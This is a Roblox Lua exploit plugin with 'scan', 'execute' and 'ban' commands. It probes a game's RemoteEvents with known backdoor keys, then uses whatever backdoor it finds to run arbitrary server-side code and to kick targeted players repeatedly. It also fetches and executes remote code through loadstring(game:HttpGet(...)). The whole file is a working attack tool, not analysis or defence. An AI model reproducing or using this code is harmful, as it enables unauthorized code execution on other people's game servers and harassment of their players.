
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local JointsService = game:GetService("JointsService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer.Backpack

local Invisible = loadstring(game:HttpGet("https://raw.githubusercontent.com/0zBug/Invisible/main/main.lua"))()

local ValueName = "Thrix" .. Invisible.Encode(LocalPlayer.Name)

function FindBackdoor()
    for _, Remote in pairs(game:GetDescendants()) do
        if Remote.ClassName == "RemoteEvent" then
            if Remote.Parent then
                if Remote.Parent == JointsService then 
                    continue 
                end

                if Remote.Parent == ReplicatedStorage and Remote:FindFirstChild("__FUNCTION") or Remote.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage then 
                    continue
                end
            end
        
            if Remote:IsDescendantOf(RobloxReplicatedStorage) then
                continue
            end

            local ValueScript = string.format("Value = Instance.new('StringValue', Workspace) Value.Name = '%s' Value.Value = '%s'", ValueName, Remote:GetFullName())

            if Remote.Name == "emma" and Remote.Parent and Remote.Parent.Name == "mynameemma" and Remote.Parent.Parent == ReplicatedStorage then
                Remote:FireServer("pwojr8hoc0-gr0yxohlgp-0feb7ncxed", ",,,,,,,,,,,,,,,", ValueScript)
            end

            if Remote.Name == "Run" and Remote.Parent and Remote.Parent:FindFirstChild("Pages") and Remote.Parent:FindFirstChild("R6") and Remote.Parent:FindFirstChild("Version") and Remote.Parent:FindFirstChild("Title") then
                Remote:FireServer("5#lGIERKWEF", ValueScript)
            end

            Remote:FireServer("helpme", ValueScript)
            Remote:FireServer("cGlja2V0dA==", ValueScript)
            Remote:FireServer(ValueScript)
        end
    end

    wait(0.5)

    local Value = Workspace:FindFirstChild(ValueName)
    if Value then
        local Current = game
        local Segments = string.split(Value.Value, ".")

        for i, v in pairs(Segments) do
            Current = Current[v]
        end

        Current:FireServer(string.format("Workspace['%s']:Destroy()", ValueName))

        print("Backdoor found!")

        return Current
    end

    print("Failed to find a backdoor.")

    return false
end

local Backdoor
local Plugin = {
    ["Name"] = "backdoor",
    ["Commands"] = {
        ["scan"] = {
            ["Description"] = "Scan for a backdoor in the game.",
            ["Function"] = function()
                Backdoor = FindBackdoor()
            end
        },
        ["execute"] = {
            ["Description"] = "Execute a code with the backdoor.",
            ["Function"] = function(...)
                if Backdoor then
                    local Code = table.concat({...}, " ")

                    Backdoor:FireServer(Code)
                end
            end
        },
        ["ban"] = {
            ["Description"] = "Ban the selected player.",
            ["Function"] = function(Player)
                local Player = GetPlayer(Player)

                for _, Player in pairs(Player) do
                    if Backdoor then
                        if Player then
                            Backdoor:FireServer(string.format("game.Players['%s']:Kick()", Player.Name))
                        end

                        Backdoor:FireServer(string.format("game.Players.PlayerAdded:Connect(function(Player) if Player.Name == '%s' then Player:Kick() end end)", Player.Name))
                    end
                end
            end
        }
    }
}

return Plugin
